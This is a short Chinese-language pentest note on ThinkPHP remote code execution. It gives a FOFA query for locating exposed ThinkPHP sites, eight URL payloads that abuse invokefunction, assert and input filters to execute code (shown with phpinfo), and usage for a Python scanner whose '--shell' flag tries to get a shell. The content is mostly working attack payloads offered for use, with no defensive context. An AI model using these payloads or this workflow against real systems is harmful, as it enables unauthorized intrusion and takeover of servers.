# FOFA

```
app="ThinkPHP"
```



# ThinkPHP RCE 漏洞

## 说明

ThinkPHP中RCE漏洞涉及的版本较多，V2以及V5中都存在该漏洞

tp框架系列中，5.0.x 跟 5.1.x 中，各个系列里的poc是几乎为通用的

比如 5.0.1中某个poc在5.0.3中也是可以用的，也就是说当我们碰到5.0.8的时候，可以尝试用5.0.1 或 5.0.5等 5.0.x 系列的poc去尝试使用，

5.1.x 系列同理

所以，一条payload可以通用多个版本的ThinkPHP，但不完全保证，可以多尝试尝试。

## poc

可用下面的poc来验证是否为RCE

```
/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"

/?s=index/think\request/input?data[]=phpinfo()&filter=assert",

/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>",

/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",

/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

/?s=index/\think\Request/input&filter[]=phpinfo&data=-1",

/?s=index/\think\module/action/param1/${@phpinfo()}"]
```

综合检验+getshell工具见**thinkphpRCE.py**

```
usage: thinkphp_rce.py [-h] [-u URL] [-f FILE] [-p PROXY] [--shell]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Start scanning url -u xxx.com
  -f FILE, --file FILE  read the url from the file
  -p PROXY, --proxy PROXY
                        use HTTP/HTTPS proxy
  --shell               try to get shell

python thinkphpRCE.py -u http:/xx.xx/ --shell //检测和getshell
```

